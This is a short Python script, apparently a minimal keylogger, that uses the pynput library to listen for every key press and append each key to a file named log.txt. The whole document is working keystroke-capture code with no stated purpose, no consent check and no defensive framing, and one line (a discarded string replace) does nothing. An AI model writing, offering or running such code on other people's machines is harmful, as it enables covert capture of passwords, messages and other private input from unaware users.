from pynput.keyboard import Listener

def logger(key):
  letter=str(key)
  letter.replace("'","")
  with open("log.txt","a") as f:
    f.write(letter)

with Listener(on_press=logger) as l:
  l.join()
